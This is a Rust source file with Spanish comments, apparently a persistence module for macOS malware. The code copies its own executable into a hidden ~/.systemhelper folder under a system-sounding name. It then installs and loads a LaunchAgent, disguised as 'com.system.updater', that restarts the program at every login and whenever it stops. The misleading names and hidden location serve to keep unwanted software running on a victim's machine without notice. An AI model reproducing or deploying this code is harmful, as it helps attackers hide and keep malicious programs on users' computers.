use std::path::PathBuf;
use std::fs;
use std::env;

pub fn install_persistence(copias: &[PathBuf]) -> Result<(), Box<dyn std::error::Error>> {
    println!("🍎 Instalando persistencia en macOS...");

    let home = env::var("HOME")?;

    // 1. DEFINIR UNA RUTA FIJA PARA EL EJECUTABLE
    // Usamos una carpeta oculta en el home para evitar conflictos
    let install_dir = format!("{}/.systemhelper", home);
    fs::create_dir_all(&install_dir)?;
    let master_path = format!("{}/systemhelper", install_dir);
    println!("📌 Copia maestra: {}", master_path);

    // 2. COPIAR EL EJECUTABLE A LA UBICACIÓN MAESTRA (si existe el original)
    if let Some(primary) = copias.first() {
        if primary.exists() {
            fs::copy(primary, &master_path)?;

            #[cfg(target_os = "macos")]
            {
                use std::os::unix::fs::PermissionsExt;
                let mut perms = fs::metadata(&master_path)?.permissions();
                perms.set_mode(0o755);
                fs::set_permissions(&master_path, perms)?;
            }
            println!("✅ Copia maestra creada en: {}", master_path);
        } else {
            eprintln!("⚠️ El ejecutable original no existe en: {:?}", primary);
        }
    }

    // 3. CREAR EL LAUNCHAGENT QUE EJECUTA LA COPIA MAESTRA
    let plist_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/systemhelper.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/systemhelper.err</string>
</dict>
</plist>"#,
        master_path
    );

    let launch_agents_dir = format!("{}/Library/LaunchAgents", home);
    fs::create_dir_all(&launch_agents_dir)?;
    let plist_path = format!("{}/com.system.updater.plist", launch_agents_dir);
    fs::write(&plist_path, plist_content)?;
    println!("✅ LaunchAgent creado: {}", plist_path);

    // 4. CARGAR EL LAUNCHAGENT (si ya está cargado, se descarga y recarga)
    // Primero intentamos descargar por si existía una versión anterior
    let _ = std::process::Command::new("launchctl")
        .args(&["unload", &plist_path])
        .output();

    // Luego cargamos
    let output = std::process::Command::new("launchctl")
        .args(&["load", &plist_path])
        .output();

    match output {
        Ok(out) => {
            if out.status.success() {
                println!("✅ LaunchAgent cargado correctamente");
            } else {
                let stderr = String::from_utf8_lossy(&out.stderr);
                println!("⚠️ Error cargando LaunchAgent: {}", stderr);
                // Fallback: usar bootstrap en sistemas modernos
                let _ = std::process::Command::new("launchctl")
                    .args(&["bootstrap", &format!("gui/{}", users::get_current_uid()), &plist_path])
                    .spawn();
            }
        }
        Err(e) => {
            println!("⚠️ Error ejecutando launchctl: {}", e);
        }
    }

    Ok(())
}
